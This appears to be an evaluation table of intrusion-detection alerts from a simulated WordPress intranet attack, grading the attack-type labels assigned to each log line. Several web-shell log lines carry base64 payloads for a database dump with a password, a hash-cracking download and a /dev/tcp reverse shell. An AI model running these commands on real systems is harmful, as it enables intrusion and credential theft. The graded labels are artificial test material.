AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
WPScan;9;Web Application Scanning;"IDS: “New request method in Apache Access log.”, “New value(s) detected”,
Raw Data: “HEAD /wp-content/plugins/animated-typing-effect/ HTTP/1.1\\\"" 404 146 \\\""https://intranet.price.fox.org\\\"" \\\""WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification based on tool name WPScan and 404 http code;Correct & expressive
WPScan;3;"Exploitation for Client Execution, 
Web Application Scanning";"IDS: “New request method in Apache Access log.”, “New value(s) detected”,
Raw Data: “HEAD /wp-content/themes/ecobiz/thumb/timthumb.php HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification based on tool name WPScan and access to timthumb.php (that has been used for remote code execution on WordPress themes);Correct & expressive
Dirb;1;"Credential Access, 
Sensitive File Discovery";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /javascript/jquery/.htpasswd HTTP/1.1\\\"" 403 366 \\\""-\\\"" \\\""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification based on http code and file that was accessed;Correct & expressive
Dirb;1;"Credential Access, 
Evasion";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /javascript/jquery/.htpasswd_ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Scanning not represented, too general;Alternate explanation for alert
Dirb;3;Web Application Fuzzing;"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /javascript/jquery/@ HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification based on special characters and 404 http code;Alternate explanation for alert
Dirb;1;"Initial Access, 
Exploit Public-Facing Application";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat”";Classification probably based on access to info.php and usage of script function;Incorrect
Dirb;1;"Discovery, 
System Information Discovery";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat”";Classification probably based on access to phpinfo.php and usage of script function;Too generic
Dirb;1;"Web Application Fuzzing, 
Privilege Escalation";"IDS: “New characters in Apache Access request.”, “New character(s) detected”, 
Raw Data: “GET /wp-includes/js/thickbox/~webmaster HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on access to ~webmaster directory;Alternate explanation for alert
Dirb;1;"Directory Traversal, 
Web Application Scanning";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http code;Correct & expressive
Dirb;1;"Reconnaissance, 
Directory Enumeration";"IDS: “New event type.”, “New path(es) detected”, 
Raw Data: “AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive”";Classification probably based on access to directory with default index file;Correct & expressive
Dirb;1;"Initial Access, 
Access Control Bypass";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”";Classification probably based on access to directory with default index file;Too generic
Dirb;4;Web Application Scanning;"IDS: “New status code in Apache Access log.”, “New value(s) detected”, 
Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification based on the access to a non-existent directory and the 301 http code;Correct & expressive
Dirb;2;"Web Application Scanning, 
Fuzzing";"IDS: “New characters in Apache Access request.”, “New character(s) detected”
Raw Data: “GET /wp-includes/js/tinymce/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";"Classification probably based on special characters and http code; as well as tool name Apache";Correct & expressive
Dirb;1;"Exploit Attempt, 
Information Gathering";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat”";Scanning not represented;Too generic
Dirb;1;"Exploitation Attempt, 
File Inclusion / Traversal";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat”";Exploitation Attempt is not expressive;Correct & expressive
Dirb;1;"Web Application Scanning,
Resource Enumeration";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat”";Classification probably based on accessing of the non-existing file ;Correct & expressive
Dirb;2;"Web Application Scanning, 
Discovery";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/phpinfo.php' not found or unable to stat”";Classification probably based on accessing of the non-existing but common file ;Correct & expressive
Dirb;1;Access Attempt to Restricted Resource;"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 403 status code and attempted access of sensitive plugin directory;Alternate explanation for alert
Dirb;5;"Directory Enumeration, 
Reconnaissance";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification based on enumeration of /admin/ directory and 404 http code;Correct & expressive
Dirb;1;Web Reconnaissance;"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and 404 http code;Too generic
Dirb;1;Web Application Discovery;"IDS: “New event type.”, “New path(es) detected”,  
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”";Classification probably based on usage of script function and access to .php file in /admin folder;Too generic
Dirb;1;"Web Reconnaissance,
Access Control Evasion";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/social/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 403 status code and attempted access to common directory;Too generic
Dirb;1;"Web Reconnaissance,
File / Directory Enumeration";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/social/.hta HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 403 status code and attempted access of common directory;Correct & expressive
Dirb;2;"Credential Access,  
File / Directory Enumeration";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 403 status code and access to .htpasswd file;Correct & expressive
Dirb;3;"Web Reconnaissance, 
Fuzzing";"IDS: “New characters in Apache Access request.”, “New character(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/js/admin/@ HTTP/1.1\\\"" 404 363 \\\""-\\\"" \\\""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on 404 status code and special characters in file path;Correct & expressive
Dirb;1;"Credential Access, 
Defense Evasion";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess”";Classification probably based on access to /admin/.htaccess;Alternate explanation for alert
Dirb;1;"Reconnaissance, 
Credential Access";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_”";Classification probably based on access to /admin/.htaccess;Too generic
Dirb;2;Credential Access;"IDS: “New event type”, “New path(es) detected”, 
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd”";Classification probably based on access to /admin/.htaccess;Too generic
Dirb;2;"Initial Access, 
Exploration";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat”";Classification probably based on access to sensitive file adminphp;Too generic
Web Shell;1;"Execution, 
Command and Control";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D”";Classification probably based on tool name apache, and high entropy string because of base64 encoding;Too generic
Web Shell;1;Command and Control;"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”, 
Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D”";Classification probably based on tool name apache, and high entropy string because of base64 encoding;Alternate explanation for alert
Password Cracking;1;"Command and Control, 
Exfiltration";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”";Line looks like web shell lines, however the base64 string decoded indicated password cracking;Incorrect
Password Cracking;1;"Command and Control,
Persistence";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,
Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”";Classification based on frequency of requests;Incorrect
Password Cracking;1;"Impact, 
Resource Hijacking";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”;Classification based on CPU usage value;Alternate explanation for alert
Password Cracking;1;Command and Control;"IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Frequency anomaly detected”,
Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”";Classification based on frequency of requests;Alternate explanation for alert
Reverse Shell;1;"Web Shell Upload,
Command Execution";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D”";Classification based on high entropy of payload in WordPress upload folder;Correct & expressive
Privilege Escalation;2;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification based on tool name su ;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Persistence";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification based on tool name su ;Correct & expressive
Privilege Escalation;1;"Credential Access, 
Privilege Escalation";"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”";Classification based on tool name su ;Correct & expressive
Privilege Escalation;1;"Credential Access, 
Persistence";"IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”";Classification based on tool name su ;Alternate explanation for alert
Privilege Escalation;1;Credential Manipulation;"IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification based on tool name su ;Alternate explanation for alert
Privilege Escalation;1;"Persistence,
Privilege Escalation";"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: ”type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification based on tool name su ;Correct & expressive
;89;;;;
